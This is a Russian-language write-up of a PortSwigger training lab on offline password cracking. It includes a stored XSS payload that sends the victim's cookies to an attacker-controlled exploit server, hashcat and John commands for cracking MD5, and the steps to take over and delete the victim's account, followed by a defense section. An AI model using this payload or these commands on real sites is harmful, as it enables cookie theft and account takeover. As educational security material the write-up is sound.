# 📘 PortSwigger Lab: Offline Password Cracking

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking  
> 📚 Теория PortSwigger: https://portswigger.net/web-security/authentication/other-mechanisms  
> 🎯 Тема: Authentication vulnerabilities — vulnerabilities in other authentication mechanisms  
> 🧪 Уровень: Practitioner

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🔐 Как должна работать функция Stay logged in](#correct-flow)
- [❌ Уязвимая логика приложения](#vulnerable-flow)
- [🍪 Как устроена cookie `stay-logged-in`](#cookie)
- [🔤 Почему Base64 не защищает данные](#base64)
- [#️⃣ Почему MD5 опасен для паролей](#md5)
- [⚡ Online и Offline Password Cracking](#offline)
- [💉 Как Stored XSS используется для кражи cookie](#xss)
- [🔍 Шаг 1 — Исследуем собственную cookie](#step1)
- [🔍 Шаг 2 — Подтверждаем формат cookie](#step2)
- [🔍 Шаг 3 — Подготавливаем Exploit Server](#step3)
- [🔍 Шаг 4 — Сохраняем XSS-payload в комментарии](#step4)
- [🔍 Шаг 5 — Получаем cookie Carlos](#step5)
- [🔍 Шаг 6 — Декодируем cookie](#step6)
- [🔍 Шаг 7 — Восстанавливаем пароль](#step7)
- [🔍 Шаг 8 — Входим как Carlos](#step8)
- [🔍 Шаг 9 — Удаляем аккаунт](#step9)
- [🧾 Итоговая цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)

---

<a id="goal"></a>

## 🎯 Цель

Получить cookie постоянного входа пользователя `carlos`, извлечь из неё хэш пароля, восстановить пароль офлайн, войти в аккаунт жертвы и удалить его.

Исходные данные:

```text
Свой аккаунт:
wiener:peter

Имя пользователя жертвы:
carlos
```

Для решения лаборатории необходимо:

```text
1. Исследовать функцию Stay logged in
2. Определить формат постоянной cookie
3. Украсть cookie Carlos через Stored XSS
4. Декодировать cookie
5. Получить MD5-хэш пароля
6. Восстановить исходный пароль
7. Войти как Carlos
8. Удалить его аккаунт
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Обычная сессия и функция постоянного входа решают разные задачи.

```text
Session cookie
        ↓
Поддерживает текущую авторизованную сессию
        ↓
Обычно прекращает действовать после выхода или истечения срока
```

```text
Remember-me cookie
        ↓
Позволяет восстановить вход позднее
        ↓
Может жить дни, недели или месяцы
```

Поэтому постоянный токен часто опаснее обычной session cookie.

Если атакующий крадёт действующий remember-me token, он может получить долгосрочный доступ к аккаунту.

В этой лаборатории проблема ещё серьёзнее:

```text
cookie содержит не случайный токен,
а username и MD5-хэш пароля
```

---

<a id="idea"></a>

## 🧩 Ключевая идея

Приложение создаёт cookie по формуле:

```text
Base64(username + ":" + MD5(password))
```

Для пользователя `wiener`:

```text
Username:
wiener

Password:
peter
```

MD5 пароля:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

Строка до Base64:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Cookie:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

После кражи cookie Carlos декодирование раскрывает:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

Известный пароль для этого хэша:

```text
onceuponatime
```

---

<a id="correct-flow"></a>

## 🔐 Как должна работать функция Stay logged in

Безопасная реализация должна использовать случайный непрозрачный токен.

```text
Пользователь включает Stay logged in
        ↓
Сервер создаёт криптографически случайный токен
        ↓
В браузер отправляется только случайное значение
        ↓
На сервере хранится хэш токена и user_id
        ↓
При следующем посещении сервер проверяет токен
        ↓
После использования токен ротируется
```

Пример cookie:

```http
Set-Cookie: remember_token=V1mFt3jS9...;
Secure;
HttpOnly;
SameSite=Lax;
Max-Age=2592000
```

Серверная запись:

```text
token_hash
user_id
created_at
expires_at
last_used_at
revoked
```

Ключевой принцип:

```text
Пароль и его хэш
никогда не должны передаваться клиенту.
```

---

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика приложения

Приложение работает примерно так:

```text
Пользователь вводит username и password
        ↓
Приложение вычисляет MD5(password)
        ↓
Формирует username:md5(password)
        ↓
Кодирует строку в Base64
        ↓
Сохраняет результат в stay-logged-in cookie
```

Схематично:

```text
wiener
+
:
+
MD5(peter)
        ↓
wiener:51dc30ddc473d43a6011e9ebba6ca770
        ↓
Base64
        ↓
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Проблемы:

```text
1. Base64 полностью обратим
2. MD5 слишком быстрый
3. Хэш пароля передаётся браузеру
4. Cookie доступна JavaScript
5. Комментарии уязвимы к Stored XSS
6. Пароль Carlos присутствует в известном словаре
```

---

<a id="cookie"></a>

## 🍪 Как устроена cookie `stay-logged-in`

После входа с включённой функцией:

```text
Stay logged in
```

в запросах появляется:

```http
Cookie: session=SESSION_VALUE;
stay-logged-in=BASE64_VALUE
```

Пример:

```http
GET /my-account?id=wiener HTTP/2
Host: vulnerable-website.com
Cookie: session=SESSION_VALUE; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

После Base64-декодирования:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Разделитель:

```text
:
```

Левая часть:

```text
username
```

Правая часть:

```text
MD5(password)
```

---

<a id="base64"></a>

## 🔤 Почему Base64 не защищает данные

Base64 — это кодирование, а не шифрование.

```text
Plaintext
        ↓
Base64 encode
        ↓
Encoded text
        ↓
Base64 decode
        ↓
Original plaintext
```

Для декодирования не нужен:

```text
секретный ключ
пароль
сертификат
доступ к серверу
```

Через Linux:

```bash
echo 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw' | base64 -d
```

Результат:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Через Burp Suite:

```text
Decoder
        ↓
Paste value
        ↓
Decode as
        ↓
Base64
```

Главная мысль:

```text
Base64 меняет представление данных,
но не обеспечивает конфиденциальность.
```

---

<a id="md5"></a>

## #️⃣ Почему MD5 опасен для паролей

MD5 создаёт 128-битный хэш, который обычно записывается как 32 шестнадцатеричных символа.

Пример:

```bash
echo -n 'peter' | md5sum
```

Результат:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

MD5 не подходит для паролей, потому что:

```text
1. Он вычисляется очень быстро
2. Не использует соль автоматически
3. Отлично ускоряется на GPU
4. Для известных паролей существуют готовые таблицы
5. Один пароль всегда даёт один и тот же MD5
6. Словарные атаки выполняются чрезвычайно быстро
```

Для хранения паролей используют:

```text
Argon2id
bcrypt
scrypt
PBKDF2
```

Их задача — сделать каждую попытку дорогой по времени и ресурсам.

---

<a id="offline"></a>

## ⚡ Online и Offline Password Cracking

### Online attack

При онлайн-атаке каждая попытка отправляется приложению:

```text
attacker
        ↓
POST /login
        ↓
server
        ↓
valid / invalid
```

Сервер может применять:

```text
Rate limiting
Account lockout
CAPTCHA
Temporary delays
MFA
IP monitoring
Alerting
```

### Offline attack

При офлайн-атаке атакующий уже получил хэш:

```text
26323c16d5f4dabff3bb136f2460a943
```

Дальнейшая проверка происходит локально:

```text
candidate password
        ↓
MD5(candidate)
        ↓
compare with stolen hash
```

Сервер не видит эти попытки.

Преимущества для атакующего:

```text
Нет блокировки аккаунта
Нет CAPTCHA
Нет задержки сети
Можно использовать GPU
Можно проверять огромные словари
```

Пример Hashcat:

```bash
hashcat -m 0 hash.txt passwords.txt
```

Где:

```text
-m 0 = raw MD5
```

Показать результат:

```bash
hashcat -m 0 hash.txt passwords.txt --show
```

Пример John the Ripper:

```bash
john --format=raw-md5 --wordlist=passwords.txt hash.txt
```

---

<a id="xss"></a>

## 💉 Как Stored XSS используется для кражи cookie

Stored XSS появляется, когда приложение:

```text
1. Принимает пользовательский ввод
2. Сохраняет его
3. Выводит без безопасного экранирования
4. Браузер другого пользователя выполняет JavaScript
```

В лаборатории уязвимы комментарии к публикациям.

Payload:

```html
<script>
document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
</script>
```

Когда Carlos открывает страницу:

```text
Carlos загружает публикацию
        ↓
Браузер отображает комментарий
        ↓
Тег <script> выполняется
        ↓
document.cookie читает cookie
        ↓
Браузер отправляет запрос на Exploit Server
        ↓
Cookie появляется в Access log
```

Это возможно, потому что чувствительная cookie не защищена атрибутом:

```text
HttpOnly
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Исследуем собственную cookie

Открываем лабораторию через Burp Suite.

Входим:

```text
Username: wiener
Password: peter
```

Обязательно включаем:

```text
Stay logged in
```

После входа открываем:

```text
Proxy → HTTP history
```

Находим запрос к:

```text
/my-account
```

или ответ на:

```text
POST /login
```

Ищем cookie:

```http
stay-logged-in=...
```

Пример:

```http
GET /my-account?id=wiener HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VALUE; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Подтверждаем формат cookie

Копируем значение:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Открываем:

```text
Decoder
```

Выбираем:

```text
Decode as → Base64
```

Получаем:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Проверяем пароль `peter`:

```bash
echo -n 'peter' | md5sum
```

Результат:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

Формат подтверждён:

```text
Base64(username:MD5(password))
```

Это важный этап: гипотеза проверена на контролируемой учётной записи.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Подготавливаем Exploit Server

Открываем:

```text
Go to exploit server
```

Копируем адрес:

```text
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Он понадобится как внешний сервер для получения запроса из браузера Carlos.

Затем открываем:

```text
Access log
```

Именно здесь позже появится украденная cookie.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Сохраняем XSS-payload в комментарии

Открываем любую публикацию блога.

В поле комментария помещаем:

```html
<script>
document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
</script>
```

Остальные поля можно заполнить обычными значениями:

```text
Name: test
Email: test@test.com
Website: https://example.com
```

Отправляем комментарий.

Payload сохраняется на сервере и будет выполнен в браузере пользователя, который откроет страницу.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Получаем cookie Carlos

Возвращаемся на Exploit Server.

Открываем:

```text
Access log
```

Ищем запрос от жертвы.

Пример:

```http
GET /secret=...;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Нас интересует значение:

```text
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

Это Base64-encoded cookie Carlos.

---

<a id="step6"></a>

## 🔍 Шаг 6 — Декодируем cookie

Если значение содержит URL-кодирование, сначала выполняем:

```text
Decode as → URL
```

Затем:

```text
Decode as → Base64
```

Получаем:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

Разделяем строку:

```text
Username:
carlos

MD5 hash:
26323c16d5f4dabff3bb136f2460a943
```

Теперь у нас есть материал для офлайн-подбора.

---

<a id="step7"></a>

## 🔍 Шаг 7 — Восстанавливаем пароль

Сохраняем хэш:

```bash
echo '26323c16d5f4dabff3bb136f2460a943' > hash.txt
```

### Через Hashcat

```bash
hashcat -m 0 hash.txt passwords.txt
```

Показать найденный пароль:

```bash
hashcat -m 0 hash.txt passwords.txt --show
```

### Через John the Ripper

```bash
john --format=raw-md5 --wordlist=passwords.txt hash.txt
```

Показать пароль:

```bash
john --show --format=raw-md5 hash.txt
```

Для лабораторного хэша результат:

```text
26323c16d5f4dabff3bb136f2460a943:onceuponatime
```

Следовательно:

```text
Password: onceuponatime
```

> [!WARNING]
> В реальном пентесте нельзя отправлять клиентские хэши в публичные поисковые сервисы без явного разрешения. Это может привести к утечке чувствительных данных.

---

<a id="step8"></a>

## 🔍 Шаг 8 — Входим как Carlos

Выходим из аккаунта Wiener.

Открываем:

```text
/login
```

Вводим:

```text
Username: carlos
Password: onceuponatime
```

После успешного входа открывается:

```text
/my-account?id=carlos
```

---

<a id="step9"></a>

## 🔍 Шаг 9 — Удаляем аккаунт

На странице аккаунта нажимаем:

```text
Delete account
```

Подтверждаем удаление.

Лаборатория отмечается как решённая.

---

<a id="attack-chain"></a>

## 🧾 Итоговая цепочка атаки

```text
1. Войти как wiener:peter
        ↓
2. Включить Stay logged in
        ↓
3. Найти cookie stay-logged-in
        ↓
4. Декодировать её из Base64
        ↓
5. Определить формат username:MD5(password)
        ↓
6. Создать Stored XSS комментарий
        ↓
7. Carlos открывает заражённую страницу
        ↓
8. JavaScript считывает document.cookie
        ↓
9. Браузер отправляет cookie на Exploit Server
        ↓
10. Получить cookie Carlos из Access log
        ↓
11. Base64 decode
        ↓
12. Получить hash:
26323c16d5f4dabff3bb136f2460a943
        ↓
13. Восстановить пароль:
onceuponatime
        ↓
14. Войти как carlos
        ↓
15. Удалить аккаунт
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

Атака стала возможна из-за комбинации нескольких ошибок.

### 1. Cookie содержит парольный материал

```text
username:MD5(password)
```

Хэш пароля нельзя передавать клиенту.

### 2. Используется Base64

```text
Base64 ≠ encryption
```

Любой может восстановить исходную строку.

### 3. Используется MD5

MD5 слишком быстрый и легко подбирается по словарю.

### 4. Cookie доступна JavaScript

Без `HttpOnly` её можно получить через:

```javascript
document.cookie
```

### 5. Присутствует Stored XSS

JavaScript сохраняется в комментарии и выполняется в браузере Carlos.

### 6. Пароль слабый

```text
onceuponatime
```

находится в словарях известных паролей.

Полная комбинация:

```text
Stored XSS
+
Missing HttpOnly
+
Predictable cookie
+
Base64
+
MD5
+
Weak password
=
Account takeover
```

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

При наличии функции:

```text
Remember me
Stay logged in
Keep me signed in
Trust this device
```

нужно исследовать постоянный токен.

Полезные вопросы:

```text
1. Меняется ли cookie между входами?
2. Связана ли она с username?
3. Содержит ли Base64?
4. Содержит ли JWT?
5. Видны ли user ID или email?
6. Есть ли MD5 или SHA-1?
7. Есть ли цифровая подпись?
8. Можно ли подменить username?
9. Отзывается ли cookie после logout?
10. Отзывается ли она после смены пароля?
11. Есть ли Secure?
12. Есть ли HttpOnly?
13. Есть ли SameSite?
14. Ротируется ли токен?
15. Ограничен ли срок действия?
```

При обнаружении XSS дополнительно проверяем:

```text
Какие cookie видит document.cookie?
Можно ли выполнить запросы от имени жертвы?
Можно ли получить CSRF-токены?
Есть ли CSP?
Запускается ли payload у администратора?
```

Главная мысль:

```text
Пентестер оценивает не только одну ошибку,
а возможную цепочку между несколькими ошибками.
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### 1. Не включить `Stay logged in`

Без этого постоянная cookie может не появиться.

### 2. Анализировать только session cookie

Целевая cookie называется:

```text
stay-logged-in
```

### 3. Считать Base64 шифрованием

Base64 декодируется без ключа.

### 4. Копировать cookie вместе с лишними символами

Нужно отделить значение от:

```text
stay-logged-in=
;
пробелов
других cookie
```

### 5. Не выполнить URL decode

В Access log символы могут быть представлены как:

```text
%3D
%2F
%2B
%20
```

### 6. Использовать неправильный режим Hashcat

Для raw MD5:

```text
-m 0
```

### 7. Хэшировать слово вместе с переводом строки

Неправильно:

```bash
echo 'peter' | md5sum
```

Правильно:

```bash
echo -n 'peter' | md5sum
```

### 8. Отправить payload без своего Exploit Server ID

Заглушку:

```text
YOUR-EXPLOIT-SERVER-ID
```

нужно заменить.

### 9. Ждать cookie в теле exploit-файла

Cookie появляется в:

```text
Access log
```

### 10. Войти как Carlos, но не удалить аккаунт

Для решения лаборатории недостаточно только войти.

Нужно нажать:

```text
Delete account
```

---

<a id="defense"></a>

## 🛡 Защита

### 1. Использовать случайные токены

```python
token = secrets.token_urlsafe(32)
```

Токен должен иметь высокую энтропию и не зависеть от пароля.

### 2. Хранить токен безопасно на сервере

```text
SHA-256(token)
        ↓
user_id
expires_at
revoked
```

При утечке базы открытое значение токена не должно быть доступно.

### 3. Не передавать парольный хэш клиенту

Запрещённая схема:

```text
Base64(username:MD5(password))
```

Безопасная схема:

```text
random opaque token
```

### 4. Установить атрибуты cookie

```http
Set-Cookie: remember_token=...;
Secure;
HttpOnly;
SameSite=Lax;
Path=/;
Max-Age=2592000
```

### 5. Ротировать токены

После успешного использования:

```text
Old token → revoke
New token → issue
```

### 6. Поддерживать отзыв

Токены должны аннулироваться при:

```text
Logout
Password change
Account recovery
Suspicious activity
Device removal
```

### 7. Защищать пароли современным KDF

Рекомендуется:

```text
Argon2id
```

Допустимые альтернативы:

```text
bcrypt
scrypt
PBKDF2
```

### 8. Устранить Stored XSS

Необходимо использовать:

```text
Context-aware output encoding
Safe template engine
HTML sanitization
Content Security Policy
Avoiding unsafe inline scripts
```

### 9. Не полагаться только на HttpOnly

`HttpOnly` мешает читать cookie, но не устраняет XSS.

XSS всё ещё может:

```text
Отправлять запросы от имени жертвы
Читать страницу
Изменять DOM
Получать токены из HTML
Выполнять чувствительные действия
```

---

<a id="checklist"></a>

## ✅ Чек-лист

- [x] Выполнен вход под `wiener:peter`.
- [x] Включена функция `Stay logged in`.
- [x] Найдена cookie `stay-logged-in`.
- [x] Cookie декодирована из Base64.
- [x] Определён формат `username:MD5(password)`.
- [x] MD5 пароля `peter` подтверждён локально.
- [x] Открыт Exploit Server.
- [x] Скопирован адрес Exploit Server.
- [x] Подготовлен Stored XSS payload.
- [x] Payload сохранён в комментарии.
- [x] В Access log получен запрос Carlos.
- [x] Из запроса извлечена cookie.
- [x] Выполнено URL-декодирование при необходимости.
- [x] Выполнено Base64-декодирование.
- [x] Получен хэш `26323c16d5f4dabff3bb136f2460a943`.
- [x] Восстановлен пароль `onceuponatime`.
- [x] Выполнен вход как `carlos`.
- [x] Открыта страница `My account`.
- [x] Аккаунт Carlos удалён.
- [x] Лаборатория решена.

---



# ⬆ Наверх

[Вернуться к содержанию](#top)
